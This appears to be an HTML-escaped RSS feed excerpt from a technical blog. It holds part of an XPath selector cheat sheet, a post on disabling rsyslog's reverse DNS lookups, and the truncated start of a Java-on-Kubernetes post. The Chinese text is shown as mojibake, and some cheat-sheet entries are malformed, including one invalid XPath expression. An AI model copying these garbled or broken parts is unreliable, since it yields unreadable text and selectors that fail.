&lt;h3 id=&#34;test-queries-in-the-xpath-test-bed&#34;&gt;Test queries in the Xpath test bed:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.whitebeam.org/library/guide/TechNotes/xpathtestbed.rhtm&#34;&gt;Xpath test bed&lt;/a&gt; &lt;em&gt;(whitebeam.org)&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;browser-console&#34;&gt;Browser console&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;//div&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Works in Firefox and Chrome.&lt;/p&gt;
&lt;h2 id=&#34;selectors&#34;&gt;&lt;a href=&#34;https://devhints.io/xpath#selectors&#34;&gt;#&lt;/a&gt;Selectors&lt;/h2&gt;
&lt;h3 id=&#34;descendant-selectors&#34;&gt;Descendant selectors&lt;/h3&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;code&gt;h1&lt;/code&gt;&lt;/th&gt;
          &lt;th&gt;&lt;code&gt;//h1&lt;/code&gt;&lt;/th&gt;
          &lt;th&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;div p&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;`//div//p&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;ul &amp;gt; li&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;`//ul/li&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;ul &amp;gt; li &amp;gt; a&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//ul/li/a&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;div &amp;gt; *&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//div/*&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;:root&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;`/&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;:root &amp;gt; body&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;/body&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;attribute-selectors&#34;&gt;Attribute selectors&lt;/h3&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;code&gt;#id&lt;/code&gt;&lt;/th&gt;
          &lt;th&gt;&lt;code&gt;//*[@id=&amp;quot;id&amp;quot;]&lt;/code&gt;&lt;/th&gt;
          &lt;th&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;.class&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//*[@class=&amp;quot;class&amp;quot;]&lt;/code&gt; &lt;em&gt;â€¦&lt;a href=&#34;https://devhints.io/xpath#class-check&#34;&gt;kinda&lt;/a&gt;&lt;/em&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;input[type=&amp;quot;submit&amp;quot;]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//input[@type=&amp;quot;submit&amp;quot;]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;a#abc[for=&amp;quot;xyz&amp;quot;]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;`//a[@id=&amp;ldquo;abc&amp;rdquo;][@for=&amp;ldquo;xyz&amp;rdquo;]&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;a[rel]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//a[@rel]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;a[href^=&#39;/&#39;]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;`//a[starts-with(@href, &amp;lsquo;/&amp;rsquo;)]&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;a[href$=&#39;pdf&#39;]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//a[ends-with(@href, &#39;.pdf&#39;)]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;a[href*=&#39;://&#39;]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//a[contains(@href, &#39;://&#39;)]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;a[rel~=&#39;help&#39;]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//a[contains(@rel, &#39;help&#39;)]&lt;/code&gt; &lt;em&gt;â€¦&lt;a href=&#34;https://devhints.io/xpath#class-check&#34;&gt;kinda&lt;/a&gt;&lt;/em&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;order-selectors&#34;&gt;Order selectors&lt;/h3&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;code&gt;ul &amp;gt; li:first-of-type&lt;/code&gt;&lt;/th&gt;
          &lt;th&gt;`//ul/li[1]&lt;/th&gt;
          &lt;th&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;ul &amp;gt; li:nth-of-type(2)&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//ul/li[2]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;ul &amp;gt; li:last-of-type&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//ul/li[last()]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;li#id:first-of-type&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;`//li[1][@id=&amp;ldquo;id&amp;rdquo;]&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;a:first-child&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//*[1][name()=&amp;quot;a&amp;quot;]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;a:last-child&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//*[last()][name()=&amp;quot;a&amp;quot;]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;siblings&#34;&gt;Siblings&lt;/h3&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;code&gt;h1 ~ ul&lt;/code&gt;&lt;/th&gt;
          &lt;th&gt;`//h1/following-sibling::ul&lt;/th&gt;
          &lt;th&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;h1 + ul&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//h1/following-sibling::ul[1]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;h1 ~ #id&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//h1/following-sibling::[@id=&amp;quot;id&amp;quot;]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;jquery&#34;&gt;jQuery&lt;/h3&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;code&gt;$(&#39;ul &amp;gt; li&#39;).parent()&lt;/code&gt;&lt;/th&gt;
          &lt;th&gt;`//ul/li/..&lt;/th&gt;
          &lt;th&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;$(&#39;li&#39;).closest(&#39;section&#39;)&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//li/ancestor-or-self::section&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;$(&#39;a&#39;).attr(&#39;href&#39;)&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;`//a/@href&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;$(&#39;span&#39;).text()&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//span/text()&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;other-things&#34;&gt;Other things&lt;/h3&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;code&gt;h1:not([id])&lt;/code&gt;&lt;/th&gt;
          &lt;th&gt;`//h1[not(@id)]&lt;/th&gt;
          &lt;th&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Text match&lt;/td&gt;
          &lt;td&gt;`//button[text()=&amp;ldquo;Submit&amp;rdquo;]&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Text match (substring)&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//button[contains(text(),&amp;quot;Go&amp;quot;)]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Arithmetic&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//product[@price &amp;gt; 2.50]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Has children&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//ul[*]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Has children (specific)&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;//ul[li]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Or logic&lt;/td&gt;
          &lt;td&gt;`//a[@name or @href]&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Union (joins results)&lt;/td&gt;
          &lt;td&gt;`//a | //div&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;class-check&#34;&gt;Class check&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//div&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;contains&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;concat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;,normalize-space&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@class&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,&lt;span class=&#34;s1&#34;&gt;&amp;#39; foobar &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Xpath doesnâ€™t have the â€œcheck if part of space-separated listâ€ operator, so this is the workaround (&lt;a href=&#34;http://pivotallabs.com/xpath-css-class-matching/&#34;&gt;source&lt;/a&gt;).&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç¦æ‰Rsyslogçš„dnsè§£æ</title>
      <link>https://rendoumi.com/posts/20240121-rsyslog_dns/</link>
      <pubDate>Sun, 21 Jan 2024 12:10:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240121-rsyslog_dns/</guid>
      <description>&lt;p&gt;ç½‘ç®¡æ£€æŸ¥æµé‡å›¾çš„æ—¶å€™å‘ç°ï¼Œudpçš„æµé‡å¾ˆå¤š&lt;/p&gt;
&lt;p&gt;çœ‹äº†çœ‹æ—¥å¿—ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Jun &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 00:39:28 172.16.0.1 %ASA-6-305011: Built dynamic UDP translation from inside:172.16.36.2/2160 to outside:124.243.230.6/2160  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Jun &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; 00:39:28 172.16.0.1 %ASA-6-302015: Built outbound UDP connection &lt;span class=&#34;m&#34;&gt;1369422617&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; outside:223.5.5.5/53 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;223.5.5.5/53&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to inside:172.1...  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‘ç°ä¸€å¤§å †æ˜¯æŸ¥è¯¢dns 53çš„&lt;/p&gt;
&lt;p&gt;æ€äº†æ— å…³è¿›ç¨‹ï¼Œç»§ç»­ï¼Œè¿˜æœ‰æ˜¯é‚£ä¹ˆå¤šçš„udp 53 dnsæŸ¥è¯¢&lt;/p&gt;
&lt;p&gt;æŸ¥äº†åŠå¤©æ‰å‘ç°ï¼Œæ˜¯rsyslogè®°å½•æ—¥å¿—çš„æ—¶å€™åæŸ¥ipçš„åŸŸåå¯¼è‡´çš„ï¼Œç”±äºæ˜¯å†…ç½‘åŸŸåéƒ½ä¸å¯¹ï¼Œæ‰€ä»¥ipæŸ¥ä¸åˆ°ï¼Œå°±ä¸åœçš„å¾€å…¬ç½‘dnså‘æŸ¥è¯¢ï¼Œå¯¼è‡´udpæµé‡æ¿€å¢ã€‚&lt;/p&gt;
&lt;p&gt;çŸ¥é“åŸå› å°±çŸ¥é“å¦‚ä½•è§£å†³äº†&lt;/p&gt;
&lt;p&gt;Centosä¸‹ï¼Œrsyslogå¢åŠ -x -Qç¦æ­¢è§£æçš„å‚æ•°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/sysconfig/rsyslog  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Options for rsyslogd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Syslogd options are deprecated since rsyslog v3.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# If you want to use them, switch to compatibility mode 2 by &amp;#34;-c 2&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# See rsyslogd(8) for more details&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;SYSLOGD_OPTIONS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-c 5 -x -Q&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ubuntuä¸‹ï¼Œæ–¹æ³•ä¸€æ ·ï¼Œæ–‡ä»¶ä¸ä¸€æ ·&lt;/p&gt;</description>
    </item>
    <item>
      <title>Javaä¸šåŠ¡ä¸Škubernetesçš„æ³¨æ„ç‚¹</title>
      <link>https://rendoumi.com/posts/20240119-k8s_java/</link>
      <pubDate>Fri, 19 Jan 2024 12:10:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-k8s_java/</guid>
      <description>&lt;p&gt;javaä¸šåŠ¡ä¸Šk8sçš„è¯ï¼Œçœ‹åˆ°ä¸€ç¯‡æ¯”è¾ƒå¥½çš„æ–‡ç« ï¼Œè¦æ³¨æ„çš„åœ°æ–¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;apiVersion&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;apps/v1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;kind&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Deployment&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;metadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;java-web&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;namespace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ops&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;labels&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;java-web&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;spec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;selector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;matchLabels&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;java-web&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;replicas&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;strategy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;RollingUpdate&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;metadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;java-web&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;annotations&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# ç¬¬ä¸€ç‚¹ï¼šæ–°å¢æ³¨è§£&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;loki.io/scrape&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;true&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# æŠ“å–ç›´æ¥è¾“å‡ºçš„æ—¥å¿—åˆ°lokié‡Œ&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;prometheus.io/path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;/metrics&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#é‡‡é›†çš„ç›‘æ§åœ°å€&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
